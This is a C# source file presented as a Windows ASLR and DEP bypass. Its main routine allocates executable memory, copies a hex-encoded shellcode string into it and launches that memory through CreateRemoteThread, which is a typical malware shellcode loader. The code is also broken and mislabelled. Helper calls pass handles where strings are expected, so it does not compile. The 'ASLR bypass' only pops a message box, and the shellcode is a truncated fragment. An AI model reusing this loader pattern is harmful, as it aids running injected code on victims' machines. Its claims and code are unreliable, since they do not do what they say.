using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class RuntimeManipulation
{
    delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);
    delegate IntPtr GetModuleHandleDelegate(string lpModuleName);
    delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
    delegate UInt32 WaitForSingleObjectDelegate(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    delegate int MessageBoxDelegate(IntPtr hWnd, String lpText, String lpCaption, uint uType);

    public static IntPtr GetLibraryAddress(string libraryName, string exportName)
    {
        IntPtr moduleHandle = LoadLibrary(libraryName);
        if (moduleHandle == IntPtr.Zero)
        {
            throw new Exception("Failed to load library.");
        }

        IntPtr functionAddress = GetProcAddress(moduleHandle, exportName);
        if (functionAddress == IntPtr.Zero)
        {
            throw new Exception("Failed to get the address of the exported function.");
        }

        return functionAddress;
    }

    public static void BypassASLR()
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr getProcAddressFuncAddr = GetLibraryAddress(kernel32, "GetProcAddress");
        GetProcAddressDelegate getProcAddress = (GetProcAddressDelegate)Marshal.GetDelegateForFunctionPointer(getProcAddressFuncAddr, typeof(GetProcAddressDelegate));

        IntPtr getLibraryAddressFuncAddr = getProcAddress(kernel32, "GetModuleHandleA");
        GetModuleHandleDelegate getModuleHandle = (GetModuleHandleDelegate)Marshal.GetDelegateForFunctionPointer(getLibraryAddressFuncAddr, typeof(GetModuleHandleDelegate));

        IntPtr moduleHandle = getModuleHandle(null);
        if (moduleHandle == IntPtr.Zero)
        {
            throw new Exception("Failed to get the module handle.");
        }

        IntPtr user32Addr = GetLibraryAddress(moduleHandle, "user32.dll");
        if (user32Addr == IntPtr.Zero)
        {
            throw new Exception("Failed to obtain the address of user32.dll.");
        }

        IntPtr messageBoxFuncAddr = GetLibraryAddress(user32Addr, "MessageBoxA");
        if (messageBoxFuncAddr == IntPtr.Zero)
        {
            throw new Exception("Failed to obtain the address of MessageBoxA.");
        }

        MessageBoxDelegate messageBox = (MessageBoxDelegate)Marshal.GetDelegateForFunctionPointer(messageBoxFuncAddr, typeof(MessageBoxDelegate));
        messageBox(IntPtr.Zero, "Hello World!", "ASLR Bypass", 0);
    }

    public static void BypassDEP()
    {
        string shellcode = "\x60\x64\xA1\x24\x01\x00\x00\x50\x51\x52" +
                           "\x68\x61\x72\x79\x41" +
                           "\x68\x6C\x65\x6E\x67" +
                           "\x68\x4C\x69\x62\x72" +
                           "\x68\x41\x70\x70\x6C" +
                           "\x68\x00\x20\x00\x00" +
                           "\x8B\x45\x3C" +
                           "\x8B\x7C\x05\x78" +
                           "\x31\xC9" +
                           "\x64\x8B\x41\x30" +
                           "\x8B\x40\x0C" +
                           "\x8B\x70\x14" +
                           "\x03\xD6" +
                           "\x8B\x5E\x10" +
                           "\x81\xC1\x01\x01\x00\x00" +
                           "\x8B\x34\x8B" +
                           "\x03\xD6" +
                           "\xAC" +
                           "\x3C\x61" +
                           "\x7C\x02" +
                           "\xB1";

        byte[] asByteArray = Array.ConvertAll<char, byte>(shellcode.ToCharArray(), c => (byte)c);

        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (UInt32)asByteArray.Length, 0x3000, 0x40);
        if (allocatedMemory == IntPtr.Zero)
        {
            throw new Exception("Failed to allocate memory with executable permissions.");
        }

        Marshal.Copy(asByteArray, 0, allocatedMemory, asByteArray.Length);

        IntPtr currentProcess = GetCurrentProcess();
        IntPtr hThread = CreateRemoteThread(
            currentProcess,
            IntPtr.Zero,
            0,
            allocatedMemory,
            IntPtr.Zero,
            0,
            IntPtr.Zero);

        if (hThread == IntPtr.Zero)
        {
            throw new Exception("Failed to create a remote thread.");
        }

        WaitForSingleObject(hThread, UInt32.MaxValue);
    }

    public static IntPtr GetCurrentProcess()
    {
        return Process.GetCurrentProcess().Handle;
    }

    public static int Main(string[] args)
    {
        try
        {
            BypassASLR();
            BypassDEP();
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
            return -1;
        }

        return 0;
    }
}
